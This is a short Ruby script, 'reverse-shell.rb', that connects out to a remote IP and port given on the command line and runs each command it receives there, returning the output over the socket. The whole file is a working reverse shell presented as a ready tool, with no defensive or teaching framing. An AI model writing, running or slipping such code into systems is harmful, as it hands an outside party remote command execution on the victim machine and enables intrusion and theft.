#!/usr/bin/ruby
#Snippet: reverse-shell.rb
require 'socket'

#Main function: Reverse shell
def reverse_shell(ip, port)
    puts "[*] Connecting to #{ip}:#{port}..."
    begin
        socket = TCPSocket.new(ip, port)
        puts "[*] Connected to #{ip}:#{port}."
        socket.puts "Welcome to resh (reverse-eldritch-shell). Type 'exit' to close the connection."
        loop do
            socket.print "> "
            command = socket.gets&.chomp
            break if command.nil? || command.downcase == 'exit'
            output = `#{command}` rescue "Error executing command"
            socket.puts(output.empty? ? "No output" : output)
        end
        puts "[*] Connection closed."
        socket.close
    rescue => e
        puts "[!] Error: #{e.message}"
    end
end

#Defaults and user input
ip = ARGV[0] || '127.0.0.1' # Remote IP
port = (ARGV[1] || 4444).to_i # Remote port
reverse_shell(ip, port)
